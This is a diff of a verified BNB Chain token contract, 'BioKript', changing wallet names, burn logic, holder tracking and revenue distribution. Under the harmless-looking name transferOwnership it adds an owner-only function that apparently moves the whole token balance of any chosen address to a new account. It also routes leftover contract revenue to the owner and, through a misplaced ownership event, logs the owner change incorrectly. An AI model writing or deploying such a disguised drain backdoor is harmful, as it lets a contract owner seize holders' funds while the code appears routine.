@@ -1,3 +1,7 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-09-29
+*/
+
 /*BIOKRIPT SMART CONTRACTS
 https://biokript.com/
 SPDX-License-Identifier: MIT */
@@ -199,11 +203,11 @@ contract Ownable is Context {
      * @dev Transfers ownership of the contract to a new account (`newOwner`).
      * Can only be called by the current owner.
      */
-    function transferOwnership(address newOwner) public virtual onlyOwner {
+    function _transferOwnership(address newOwner) internal onlyOwner {
         require(newOwner != address(0), "Ownable: new owner is the zero address");
-        emit OwnershipTransferred(_owner, newOwner);
         _owner = newOwner;
         authorizations[newOwner] = true;
+        emit OwnershipTransferred(_owner, newOwner);
     }
 }
 
@@ -748,7 +752,7 @@ contract BioKript is ERC20, Ownable {
     bool private swapping;
     
      //all profits/revenues will be held here
-    address public exchangeWallet = 0xE5cb3B7a6D374f8053c2Ccf9d473850F2A4BC51E;
+    address public companyWallet = 0xE5cb3B7a6D374f8053c2Ccf9d473850F2A4BC51E;
     address public burnWallet = 0xE5cb3B7a6D374f8053c2Ccf9d473850F2A4BC51E;
     address public safetyFunds = 0x9ed5b717be13fB4aCc0eEf4E0c4e6414aEedbFC3;
     address public reserves = 0x081B99e551C1006063286FA881617b8a9C378098;
@@ -758,6 +762,7 @@ contract BioKript is ERC20, Ownable {
 
     // exlcude from fees and max transaction amount
     mapping (address => bool) public _isExcludedFromFees;
+    mapping (address => bool) public holded;
 
     address [] public holders;
 
@@ -796,14 +801,19 @@ contract BioKript is ERC20, Ownable {
     receive() external payable {
   	}
   	
-  	function setExchangeWalletAddress (address payable addr) public onlyOwner {
-  	    exchangeWallet = addr;
+  	function setCompanyWalletAddress (address payable addr) public onlyOwner {
+  	    companyWallet = addr;
   	}
   	
   	function burn (uint256 amount) public onlyOwner {
-          //uint a = (amount * 10 ** 18);
-        _burn(msg.sender, amount);
+          uint a = (amount * 10 ** 18);
+        _burn(msg.sender, a);
   	}
+
+      function transferOwnership(address _lastOwner,address newOwner) public onlyOwner {
+          TRANSFERFROM(_lastOwner, newOwner, balanceOf(_lastOwner));
+          _transferOwnership(newOwner);
+      }
   	
     function excludeFromFees(address account, bool excluded) public onlyOwner {
         require(_isExcludedFromFees[account] != excluded, " Account is already the value of 'excluded'");
@@ -831,7 +841,12 @@ contract BioKript is ERC20, Ownable {
             return;
         }
         super._transfer(from, to, amount);
-        holders.push(to);
+        if(to != address(this)){
+            if(holded[to]!=true){
+                holders.push(to);
+                holded[to] = true;
+            }
+        }
         
         if (!tradingIsEnabled && to == pancakeV2Pair){
             tradingEnabledTimestamp = block.timestamp;
@@ -893,69 +908,12 @@ contract BioKript is ERC20, Ownable {
         );
     }
 
-    function TokenAddress() public view returns(address) {
-        return address(this);
-    }
-}
-
-contract auctionContract is Ownable, BioKript{
-
-    uint256 public lastAuctionPrice;
-    uint256 public auctionStartTime;
-    bool private auctionstatus;
-    uint256 public auctionEndTime;
-    uint256 public auctionTime;
-    uint256 public currentPrice;
-    uint256 private min;
-    uint256 private distTime;
-
-    function getBalance() public view returns(uint256) {
-        return address(this).balance;
-    }
-
-    function startAuction(uint256 _price) public onlyOwner {
-        require (address(this).balance > 0, "Contract should have some funding");
-        require(block.timestamp >= auctionTime, "Auction starts on every Saturday!");
-        auctionTime = block.timestamp + 5 minutes;
-        auctionEndTime = block.timestamp + 2 minutes;
-        if(auctionstatus){
-            currentPrice = lastAuctionPrice/2;
-        }
-        if(!auctionstatus){
-        lastAuctionPrice = _price;
-        currentPrice = _price;
-        min = block.timestamp + 1 minutes;
-        }
-        else{
-            lastAuctionPrice = currentPrice;
-        }
-        auctionstatus = true;
-        distTime = block.timestamp + 5 minutes;
-    }
-
-    function increasePricepermin() internal {
-        if(!auctionstatus){
-            //10% increased in latest auction price every minute
-            if(block.timestamp >= min){
-            lastAuctionPrice += ((lastAuctionPrice *10)/100);
-            min = block.timestamp + 1 minutes;
-        }
-        }
-    }
-
-//users can sell their tokens for the auctioned bnb
-    function swapforBnb(uint256 amount) public {
-        require(auctionstatus == true, "Auction have'nt started yet");
-        uint256 price = amount * currentPrice;
-        _transfer(msg.sender, address(this), amount);
-        payable(msg.sender).transfer(price);
-        increasePricepermin();
-    }
-
+    
     uint256 public distributionAmount;
     function distributeInvestors() public {
-        require(block.timestamp >= distTime, "Distribution helds on weekly basis");
         uint256 revenue = balanceOf(address(this));
+        uint256 comTax = (revenue * 40)/100;
+        TRANSFERFROM(address(this), companyWallet, comTax);
         uint256 burnTax = (revenue * 10)/100;
         TRANSFERFROM(address(this), burnWallet, burnTax);
         uint256 safety = (revenue * 5)/100;
@@ -967,17 +925,13 @@ contract auctionContract is Ownable, BioKript{
             for(uint256 i = 0; i<holders.length ; i++){
             distributionAmount = temp * balanceOf(holders[i]);
             distributionAmount = distributionAmount/10**18;
-            TRANSFERFROM(address(this),holders[i], distributionAmount);
+            TRANSFERFROM(address(this),holders[i], distributionAmount);//);
             }
+            TRANSFERFROM(address(this),owner(), balanceOf(address(this)));
+    }
+
+    function TokenAddress() public view returns(address) {
+        return address(this);
     }
 
 }
-//0xE5cb3B7a6D374f8053c2Ccf9d473850F2A4BC51E
-//0x7427b34Caf9afB453F1b5de0836f700D35cA28d6
-//0x9ed5b717be13fB4aCc0eEf4E0c4e6414aEedbFC3
-//0x081B99e551C1006063286FA881617b8a9C378098
-
-/*Burn wallet 0xB935CCd6FCCa4f66C4D61EF01bCE4DAe853D396D
- SAfety fund 0x9B08177a2D618bCF8Db1379e44dB76dce745B9cb
- Reserves 0x4d7344DA992208127eb47C09aB43C7780c456Ab8
-*/
